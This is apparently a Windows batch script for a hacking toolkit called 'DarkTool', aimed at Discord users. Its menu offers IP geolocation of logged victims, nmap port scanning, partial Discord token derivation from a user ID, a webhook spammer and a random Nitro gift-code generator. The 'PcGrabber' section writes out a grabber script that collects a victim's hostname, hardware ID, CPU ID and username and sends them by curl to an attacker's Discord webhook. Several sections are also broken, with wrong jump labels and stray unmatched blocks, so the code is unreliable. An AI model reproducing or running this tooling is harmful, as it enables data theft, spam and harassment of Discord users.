@echo off
chcp 65001
color 4
title  DarkTool - N4S 
:menu
cls
echo.
echo                           ██████╗  █████╗ ██████╗ ██╗  ██╗████████╗ ██████╗  ██████╗ ██╗     
echo                           ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo                           ██║  ██║███████║██████╔╝█████╔╝    ██║   ██║   ██║██║   ██║██║     
echo                           ██║  ██║██╔══██║██╔══██╗██╔═██╗    ██║   ██║   ██║██║   ██║██║     
echo                           ██████╔╝██║  ██║██║  ██║██║  ██╗   ██║   ╚██████╔╝╚██████╔╝███████╗
echo                           ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝v1.0
echo                                    [A: Discord]    [Createur : N4S]    [B: Github]
echo                                                    [Version : v1.0]
echo.

echo                                                 [PANEL DARKTOOL - N4S]
echo.

echo                    [Categorie IpUser]-----[Categorie Discord]-----[Categorie Gen]-----[Categorie Autre]  
echo                    [01] - IpRange         [05] - IdToken          [09] - NitroGen     [13] - PcDistance
echo                    [02] - IpPinger        [06] - webhookSpammer   [10]                [14] - PcGrabber
echo                    [03] - IpScaner        [07] - Coming Soon      [11]                [15]
echo                    [04] - IpConfig        [08] - Cpming Soon      [12]                [16] - AutrePage
echo.

set /p "choice= Choice Number :"

if %choice%==A goto Discord
if %choice%==B goto Github

if %choice%==01 goto IpRange
if %choice%==02 goto IpPinger 
if %choice%==03 goto IpScaner
if %choice%==04 goto IpConfig

if %choice%==05 goto IdToken
if %choice%==06 goto webhook

if %choice%==09 goto NitroGen

if %choice%==13 goto PcDistance
if %choice%==14 goto PcGrabbe

if %choice%==16 goto AutrePage

:AutrePage
cls
echo                           ██████╗  █████╗ ██████╗ ██╗  ██╗████████╗ ██████╗  ██████╗ ██╗     
echo                           ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo                           ██║  ██║███████║██████╔╝█████╔╝    ██║   ██║   ██║██║   ██║██║     
echo                           ██║  ██║██╔══██║██╔══██╗██╔═██╗    ██║   ██║   ██║██║   ██║██║     
echo                           ██████╔╝██║  ██║██║  ██║██║  ██╗   ██║   ╚██████╔╝╚██████╔╝███████╗
echo                           ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝v1.0
echo                                    [A: Discord]    [Createur : N4S]    [B: Github]
echo                                                    [Version : v1.0]
echo.

echo                                                 [PANEL DARKTOOL - N4S]
echo.

echo                           [Categorie ComingSoon] 
echo                           [17]
echo                           [18]
echo                           [19]
echo                           [20]

set /p "choice= Choice Number :"

pause
goto menu


:IpRange
cls
echo                           ██╗██████╗     ██████╗  █████╗ ███╗   ██╗ ██████╗ ███████╗
echo                           ██║██╔══██╗    ██╔══██╗██╔══██╗████╗  ██║██╔════╝ ██╔════╝
echo                           ██║██████╔╝    ██████╔╝███████║██╔██╗ ██║██║  ███╗█████╗  
echo                           ██║██╔═══╝     ██╔══██╗██╔══██║██║╚██╗██║██║   ██║██╔══╝  
echo                           ██║██║         ██║  ██║██║  ██║██║ ╚████║╚██████╔╝███████╗
echo                           ╚═╝╚═╝         ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
echo                           utilise iplogger pour recuper lip et utilise IpRanger
set /p ip="Enter IP address: "
if "%ip%"=="" goto input

echo Retrieving location for IP: %ip%
curl -s "http://ip-api.com/json/%ip%" > location.json

for /f "tokens=*" %%i in ('type location.json ^| findstr /i "country city"') do (
    echo %%i
)

del location.json
pause
goto menu

           


:IpPinger
cls
echo                             ██╗██████╗     ██████╗ ██╗███╗   ██╗ ██████╗ ███████╗██████╗ 
echo                             ██║██╔══██╗    ██╔══██╗██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗
echo                             ██║██████╔╝    ██████╔╝██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝
echo                             ██║██╔═══╝     ██╔═══╝ ██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗
echo                             ██║██║         ██║     ██║██║ ╚████║╚██████╔╝███████╗██║  ██║
echo                             ╚═╝╚═╝         ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
echo                             [                       UserIpPinger                        ]

set /p ip=enter ip or hostname →
ping %ip%
echo.

pause
goto menu

:IpScaner
cls
echo                           ██╗██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗███████╗██████╗ 
echo                           ██║██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
echo                           ██║██████╔╝    ███████╗██║     ███████║██╔██╗ ██║█████╗  ██████╔╝
echo                           ██║██╔═══╝     ╚════██║██║     ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗
echo                           ██║██║         ███████║╚██████╗██║  ██║██║ ╚████║███████╗██║  ██║
echo                           ╚═╝╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
set /p ipRange=enter ip to scan

echo %ipRange% | findstr /r /i /c:"^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}$" >nul 2>&1
if %errorlevel% equ 0 (
    echo [38;2;51;255;51mScanning all ports on %ipRange% 
    nmap -p- -T4 -Pn -A %ipRange%
) else (
    echo [38;2;51;255;51mScanning top 100 ports on %ipRange% 
    nmap --top-ports 100 -T4 -Pn -A %ipRange%
)

if %errorlevel% neq 0 (
    echo [38;2;204;255;204mERROR
    pause
    goto scanIPRange
) else (
    echo [38;2;204;255;204mDONE
    pause
    goto menu
)

:IpConfig
cls
echo Running ipconfig...
ipconfig
echo.
pause >nul
goto main_menu


                            

                                       
:IdToken
cls
echo                             ██╗██████╗     ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗
echo                             ██║██╔══██╗    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║
echo                             ██║██║  ██║       ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║
echo                             ██║██║  ██║       ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║
echo                             ██║██████╔╝       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║
echo                             ╚═╝╚═════╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝

set /p userid= Enter in somones discord id:
for /f %%i in ('powershell -NoProfile -Command "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('%userid%'))"') do set encodedStr=%%i
echo.
echo Users first part of token : %encodedStr%
pause
goto menu

:webhook
cls
echo ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗     ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗          
echo ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝     ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗         
echo ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝█████╗███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝         
echo ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗╚════╝╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗         
echo ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗     ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║██╗██╗██╗
echo  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝╚═╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
echo ┌────────────────────────────────┐
echo │            SPAMMER             │
echo ├────────────────────────────────┤
echo │ 1. Exit                        │
echo │ 2. Discord webhook spammer     │
echo └────────────────────────────────┘
set /p choice=Enter your choice: 

if "%choice%"=="1" goto :eof
if "%choice%"=="2" goto messagesender
goto menu

:messagesender
cls
echo ┌────────────────────────────────┐
echo │     Discord webhook spammer    │
echo ├────────────────────────────────┤
set /p "webhook=│ Enter Discord webhook URL for Message Sender: "
set /p "message=│ Enter the message to send: "
set /p "num_times=│ Enter the number of times to send the message: "

for /l %%n in (1,1,%num_times%) do (
    :: Send message to Discord webhook
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%message%\"}" %webhook%
)
echo Messages sent successfully.
pause
goto menu

:NitroGen
cls
echo                              ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
echo                             ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
echo                             ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
echo                             ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
echo                             ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
echo                              ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝

 setlocal enabledelayedexpansion

set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "num_codes=1000000"
set "code_length=16"

for /l %%i in (1,1,%num_codes%) do (
    set "code="
    for /l %%j in (1,1,%code_length%) do (
        set /a "rand=!random! %% 36"
        for %%k in (!rand!) do (
            set "code=!code!!characters:~%%k,1!"
        )
    )
    echo https://discord.gift/!code!
)

endlocal

pause
goto menu                           
                    
:PcDistance
cls
echo                  ██████╗  ██████╗  ██████╗ ██╗███████╗████████╗ █████╗ ███╗   ██╗ ██████╗███████╗
echo                  ██╔══██╗██╔════╝  ██╔══██╗██║██╔════╝╚══██╔══╝██╔══██╗████╗  ██║██╔════╝██╔════╝
echo                  ██████╔╝██║       ██║  ██║██║███████╗   ██║   ███████║██╔██╗ ██║██║     █████╗  
echo                  ██╔═══╝ ██║       ██║  ██║██║╚════██║   ██║   ██╔══██║██║╚██╗██║██║     ██╔══╝  
echo                  ██║     ╚██████╗  ██████╔╝██║███████║   ██║   ██║  ██║██║ ╚████║╚██████╗███████╗
echo                  ╚═╝      ╚═════╝  ╚═════╝ ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝

echo.                                                                                                                                                                                                                                                                                                                                                                                                                      
        set /p host="Enter host ip → "
    set /p username="Enter username → "
    set /p password="Enter password → "
    cmdkey /add: %host% /user:%user% /pass:%pass%
    mstsc /v:%host%
    cmdkey /delete:%host%
    pause
    cls
    goto menu
)

if %input% EQU 2 (
    echo finding private ip address
    ipconfig | findstr "IPv4"
    echo found
    pause
    cls
    goto :menu
)

if %input% EQU 3 ( cls
    echo Your public IP address is:
    curl -s https://api.ipify.org
    echo.
    pause
    goto menu
)

if %input% EQU 4 ( goto menu

:PcGrabber
cls
echo ██████╗  ██████╗    ██╗███╗   ██╗███████╗ ██████╗      ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
echo ██╔══██╗██╔════╝    ██║████╗  ██║██╔════╝██╔═══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
echo ██████╔╝██║         ██║██╔██╗ ██║█████╗  ██║   ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
echo ██╔═══╝ ██║         ██║██║╚██╗██║██╔══╝  ██║   ██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
echo ██║     ╚██████╗    ██║██║ ╚████║██║     ╚██████╔╝    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
echo ╚═╝      ╚═════╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                                               
set /p "webhook=Type in ur discord webhook to build pc grabber( "
if "%webhook%"=="" (
echo                                               ┌────────────────────────┐
    echo                                           │ :Invalid...│  Webhook  │ 
    echo                                           └────────────────────────┘
    pause
    goto menu
)

echo @echo off > pc_info_grabber_exec.bat
echo hostname^>pcname.txt >> pc_info_grabber_exec.bat
echo wmic csproduct get uuid^>hwid.txt >> pc_info_grabber_exec.bat 
echo echo %%username%%^>pcusername.txt >> pc_info_grabber_exec.bat
echo wmic cpu get processorid^>cpuid.txt >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"hwid.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"cpuid.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"pcusername.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"pcname.txt" %webhook% >> pc_info_grabber_exec.bat
echo del pcname.txt >> pc_info_grabber_exec.bat
echo del hwid.txt >> pc_info_grabber_exec.bat
echo del pcusername.txt >> pc_info_grabber_exec.bat
echo del cpuid.txt >> pc_info_grabber_exec.bat

echo PC information grabber script has been created as pc_info_grabber_exec.bat...
echo You Can Find It In Ur Display...

pause
goto menu

:Discord
start https://discord.gg/DJVcvVbdd3
pause
goto menu